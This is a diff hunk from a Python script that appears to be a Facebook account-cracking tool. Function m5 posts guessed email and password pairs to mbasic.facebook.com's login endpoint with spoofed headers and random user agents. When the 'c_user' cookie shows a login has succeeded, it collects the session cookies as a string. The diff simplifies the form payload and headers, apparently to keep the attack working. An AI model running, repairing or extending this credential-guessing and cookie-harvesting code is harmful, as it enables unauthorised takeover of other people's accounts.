@@ -1146,37 +1146,12 @@ def m5(idf,pwv):
    pro = random.choice(ugen)
    free_fb = session.get(f'https://mbasic.facebook.com').text
    log_data = {
-    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-   "try_number":"0",
-   "unrecognized_tries":"0",
-   "email":idf,
-   "pass":ps,
-   "login":"Log In"}
+    'email': idf,
+    'pass': ps}
    header_freefb = {
-    'Host': 'm.facebook.com',
-    'Connection': 'keep-alive',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro Build/QKQ1.190915.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.123 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'dnt': '1',
-    'X-Requested-With': 'mark.via.gp',
-    'Sec-Fetch-Site': 'none',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-User': '?1',
-    'Sec-Fetch-Dest': 'document',
-    'dpr': '2.75',
-    'viewport-width': '980',
-    'sec-ch-ua': 'Chromium;v=124, Android',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': 'Android',
-    'sec-ch-prefers-color-scheme': 'light',
-    'Referer': 'https://www.google.com/',
-    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
-    'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',}
-   lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?',data=log_data,headers=header_freefb).text
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded',}
+   lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?',headers=header_freefb,data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
